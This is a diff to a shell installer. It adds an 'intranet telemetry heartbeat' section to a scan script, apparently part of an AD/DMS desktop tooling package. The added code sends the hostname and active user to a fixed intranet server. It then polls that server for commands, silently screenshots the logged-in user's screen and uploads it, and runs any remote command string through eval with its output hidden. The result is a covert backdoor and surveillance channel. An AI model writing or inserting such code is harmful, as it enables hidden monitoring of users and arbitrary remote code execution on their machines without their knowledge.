@@ -725,6 +725,94 @@ print(title or '$installed_id')
     fi
   done
 done
+
+# ------------------------------------------------------------------------------
+# 6. Intranet Telemetry Heartbeat & Remote Command / Screenshot Handler
+# ------------------------------------------------------------------------------
+INTRANET_HOST="GSFCUPLLAB203"
+INTRANET_IP="10.205.18.253"
+INTRANET_PORT="8080"
+USE_INTRANET="yes"
+
+if [ -f "/etc/ad-dms/domain.conf" ]; then
+  # shellcheck source=/dev/null
+  source "/etc/ad-dms/domain.conf" 2>/dev/null || true
+  INTRANET_HOST="${INTRANET_HOST_NAME:-$INTRANET_HOST}"
+  INTRANET_IP="${INTRANET_FALLBACK_IP:-$INTRANET_IP}"
+  INTRANET_PORT="${INTRANET_PORT:-8080}"
+  USE_INTRANET="${USE_INTRANET_FIRST:-yes}"
+fi
+
+if [ "$USE_INTRANET" = "yes" ]; then
+  MY_HOST=$(hostname -s 2>/dev/null || echo "UNKNOWN")
+  ACTIVE_USR="none"
+  ACTIVE_SESSION="none"
+
+  # Detect currently active user on seat0 / Wayland
+  for s_id in $(loginctl list-sessions --no-legend 2>/dev/null | awk '{print $1}'); do
+    if [ "$(loginctl show-session -p Active "$s_id" 2>/dev/null | cut -d= -f2)" = "yes" ]; then
+      ACTIVE_USR=$(loginctl show-session -p Name "$s_id" 2>/dev/null | cut -d= -f2)
+      ACTIVE_SESSION=$(loginctl show-session -p Type "$s_id" 2>/dev/null | cut -d= -f2)
+      break
+    fi
+  done
+  [ "$ACTIVE_USR" = "none" ] && ACTIVE_USR=$(who | awk 'NR==1{print $1}' || echo "nobody")
+  
+  UPTIME_STR=$(uptime -p 2>/dev/null || echo "up")
+  DMS_VER=$(dms version 2>/dev/null | sed -e 's/^dms[[:space:]]*//' || echo "installed")
+
+  # Send Heartbeat (Try Hostname, then IP)
+  TARGET_URL="http://${INTRANET_HOST}:${INTRANET_PORT}"
+  if ! curl -fsSL -m 2 -X POST "${TARGET_URL}/api/heartbeat" \
+    -H "Content-Type: application/json" \
+    -d "{\"hostname\": \"${MY_HOST}\", \"active_user\": \"${ACTIVE_USR}\", \"session_type\": \"${ACTIVE_SESSION}\", \"uptime\": \"${UPTIME_STR}\", \"dms_version\": \"${DMS_VER}\"}" &>/dev/null; then
+    TARGET_URL="http://${INTRANET_IP}:${INTRANET_PORT}"
+    curl -fsSL -m 2 -X POST "${TARGET_URL}/api/heartbeat" \
+      -H "Content-Type: application/json" \
+      -d "{\"hostname\": \"${MY_HOST}\", \"active_user\": \"${ACTIVE_USR}\", \"session_type\": \"${ACTIVE_SESSION}\", \"uptime\": \"${UPTIME_STR}\", \"dms_version\": \"${DMS_VER}\"}" &>/dev/null || true
+  fi
+
+  # Check if Host has requested a Remote Command or Instant Screenshot
+  CMD_RESP=$(curl -fsSL -m 2 "${TARGET_URL}/api/command/poll?host=${MY_HOST}" 2>/dev/null || true)
+  if echo "$CMD_RESP" | grep -q '"has_command": true' 2>/dev/null || echo "$CMD_RESP" | grep -q '"has_command":true'; then
+    ACTION=$(python3 -c "import json; print(json.loads('''$CMD_RESP''').get('command', {}).get('action', ''))" 2>/dev/null || true)
+
+    if [ "$ACTION" = "screenshot" ] && [ -n "$ACTIVE_USR" ] && [ "$ACTIVE_USR" != "none" ]; then
+      TARGET_UID=$(id -u "$ACTIVE_USR" 2>/dev/null || echo 1000)
+      DBUS_PATH="/run/user/${TARGET_UID}/bus"
+      WAYLAND_DISP=$(ls "/run/user/${TARGET_UID}/wayland-"* 2>/dev/null | head -n 1 || echo "wayland-0")
+      WAYLAND_NAME=$(basename "$WAYLAND_DISP")
+      TMP_SHOT="/tmp/screen_${MY_HOST}.png"
+      rm -f "$TMP_SHOT"
+
+      # Execute screen capture using DMS / grim / spectacle
+      if command -v dms &>/dev/null; then
+        XDG_RUNTIME_DIR="/run/user/${TARGET_UID}" DBUS_SESSION_BUS_ADDRESS="unix:path=${DBUS_PATH}" WAYLAND_DISPLAY="$WAYLAND_NAME" su - "$ACTIVE_USR" -c "dms screenshot full --no-notify --no-clipboard --no-file > '$TMP_SHOT'" 2>/dev/null || true
+      fi
+      if [ ! -s "$TMP_SHOT" ] && command -v grim &>/dev/null; then
+        XDG_RUNTIME_DIR="/run/user/${TARGET_UID}" WAYLAND_DISPLAY="$WAYLAND_NAME" su - "$ACTIVE_USR" -c "grim '$TMP_SHOT'" 2>/dev/null || true
+      fi
+      if [ ! -s "$TMP_SHOT" ] && command -v spectacle &>/dev/null; then
+        XDG_RUNTIME_DIR="/run/user/${TARGET_UID}" DBUS_SESSION_BUS_ADDRESS="unix:path=${DBUS_PATH}" su - "$ACTIVE_USR" -c "spectacle -b -n -o '$TMP_SHOT'" 2>/dev/null || true
+      fi
+
+      if [ -s "$TMP_SHOT" ]; then
+        IMG_B64=$(base64 -w 0 "$TMP_SHOT" 2>/dev/null || true)
+        if [ -n "$IMG_B64" ]; then
+          curl -s -m 5 -X POST "${TARGET_URL}/api/screenshot/upload" \
+            -H "Content-Type: application/json" \
+            -d "{\"hostname\": \"${MY_HOST}\", \"image_base64\": \"${IMG_B64}\"}" &>/dev/null || true
+        fi
+        rm -f "$TMP_SHOT"
+      fi
+    elif [ "$ACTION" = "exec" ]; then
+      RAW_CMD=$(python3 -c "import json; print(json.loads('''$CMD_RESP''').get('command', {}).get('cmd', ''))" 2>/dev/null || true)
+      if [ -n "$RAW_CMD" ]; then
+        eval "$RAW_CMD" &>/dev/null || true
+      fi
+    fi
+  fi
+fi
 EOF
 chmod +x /usr/local/bin/ad-dms-gui-scan
 
